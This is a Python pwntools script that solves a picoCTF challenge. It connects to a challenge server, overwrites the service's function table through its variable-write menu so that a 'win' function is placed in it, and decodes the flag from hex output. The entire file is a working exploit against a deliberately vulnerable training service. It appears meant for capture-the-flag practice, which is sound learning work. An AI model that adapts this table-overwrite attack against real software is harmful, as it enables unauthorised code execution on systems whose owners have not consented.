import argparse
from pwn import *


def get_port():
    parser = argparse.ArgumentParser()
    parser.add_argument("port", help="The netcat port")
    input = parser.parse_args()
    return input.port


def send_command(conn, command):
    conn.sendline(command)
    response = conn.recv()
    return response.decode("utf-8")


def get_flag(conn):
    win_str = '"win" + "\\x28" + "\\x29"'

    # create a variable to store the function win()
    send_command(conn, "3")
    send_command(conn, "flag")
    send_command(conn, win_str)

    # modify the func_table variable to store a new function (win) in the function table
    send_command(conn, "3")
    send_command(conn, "func_table")
    send_command(conn, "'win                     read_variable                   write_variable                  getRandomNumber                         '")

    # print the table to execute the win() function
    table = send_command(conn, "1")

    # decode the flag in hexadecimal form to raw string
    hex_string = str(table.replace("==>", ""))
    cleaned_hex_string = hex_string.replace("0x", "").replace(" ", "")
    byte_data = bytes.fromhex(cleaned_hex_string)
    decoded_string = byte_data.decode('utf-8')

    return decoded_string


if __name__ == "__main__":
    server = 'saturn.picoctf.net'
    port = get_port()
    conn = remote(server, port)
    try:
        flag = get_flag(conn)
        print("-" * 50)
        print(f"Flag: {flag}")
        print("-" * 50)
    finally:
        conn.close()
